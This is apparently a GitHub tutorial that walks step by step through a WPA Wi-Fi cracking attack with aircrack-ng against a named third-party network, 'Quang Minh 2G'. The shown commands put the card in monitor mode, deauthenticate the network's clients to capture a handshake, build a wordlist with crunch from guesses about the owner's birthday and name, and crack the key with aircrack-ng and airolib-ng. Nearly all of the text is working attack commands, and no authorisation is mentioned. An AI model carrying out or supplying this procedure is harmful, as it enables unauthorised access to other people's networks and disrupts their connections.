# Example crack wpa attack with aircrack-ng

i use tp-link wn725n (chipset rtl8188eus) and parrotOS

connect your card wifi and check

```
iwconfig
```

![image](https://user-images.githubusercontent.com/90561566/168417974-d9650a49-951b-4a6f-ab8b-12e4f7cd7455.png)

```
airmon-ng check kill
airmon-ng start <iface>
```

![image](https://user-images.githubusercontent.com/90561566/168418068-964e3312-b269-44fc-9721-398be478f2ce.png)

```
airodump-ng <iface>
```

![image](https://user-images.githubusercontent.com/90561566/168418114-4d4e8f16-58ec-4358-bc99-dd625f4e7d26.png)

i will choose target is `Quang Minh 2G`, CH `11`, bssid `5C:1A:6F:88:19:19` to monitor close

```
airodump-ng -c <CH> --bssid <bssid> -w out <iface>
```

![image](https://user-images.githubusercontent.com/90561566/168418356-e901847a-143e-4509-85b2-efeb783b1ca1.png)

new terminal

```
aireplay-ng --deauth 0 -a <bssid> <iface>
```

![image](https://user-images.githubusercontent.com/90561566/168418251-fe850fa5-0687-4241-836d-9d287f276e95.png)

wait about 5s, return airodump-ng terminal, if you see WPA handshake is okay and Ctrl+C to stop (both)

![image](https://user-images.githubusercontent.com/90561566/166421288-8ba74de3-f6f9-4973-be3e-d9aafd8fcb11.png)

```
ls
```

![image](https://user-images.githubusercontent.com/90561566/166421374-cfcf7080-c28a-402b-a6cb-9fda3a275a91.png)

create passlist

```
crunch <min> <max> <charset> -t <pattern> -o password.txt
```

because it's going to be a very, very large file, so i'm going to reveal that

the password is 8 numbers (i think it contains in his birthday) and 1 character (i think it contains in his name)

you can also use [Cupp](https://github.com/lucthienphong1120/cupp) to make such inferences

![image](https://user-images.githubusercontent.com/90561566/166604507-5c291bf0-6961-4a15-8c52-cf5faf0b749f.png)

the output file about 11,5 GB and 1,2 billion passwords

---

now you can crack wpa with

```
aircrack-ng -w password.txt out*.cap
```

or redirect directly from crunch

```
crunch <min> <max> <charset> -t <pattern> | aircrack-ng -w- out*.cap
```

![image](https://user-images.githubusercontent.com/90561566/193245022-8c0a5de2-32c6-4b34-bb8d-30dc8ce51521.png)

---

but i will use database to speed up the attack

it will take more time to set up the database (but it will be much faster than regular crack)

you should only use it if you create a permanent database for crack because it will take a long time (or the passlist is not too long)

install sqlite3 `sudo apt install sqlite3`

create a file `essid.txt` this write name of target wifi

![image](https://user-images.githubusercontent.com/90561566/166434891-81c08ca3-48ff-4579-9a74-fe6e65634b42.png)

```
airolib-ng crackwpa --import passwd password.txt
airolib-ng crackwpa --import essid essid.txt
```

![image](https://user-images.githubusercontent.com/90561566/166435872-44a73959-3784-41c3-849a-5c1aa823dcd4.png)

```
airolib-ng crackwpa --batch
```

![image](https://user-images.githubusercontent.com/90561566/166454564-9b6cd253-74a0-4304-b94e-988a3e92f825.png)


now crack with database, you will be surprised

```
aircrack-ng -r crackwpa out*.cap
```

done! there is the password (crack speed is about 36 GB/s)

![image](https://user-images.githubusercontent.com/90561566/166684325-e337e6cd-f376-4172-91a2-617a80a3156c.png)

```
airmon-ng stop <iface>
service NetworkManager restart
```

![image](https://user-images.githubusercontent.com/90561566/168418601-6af69920-10bc-47ea-b5d7-7d5fc0ea3017.png)










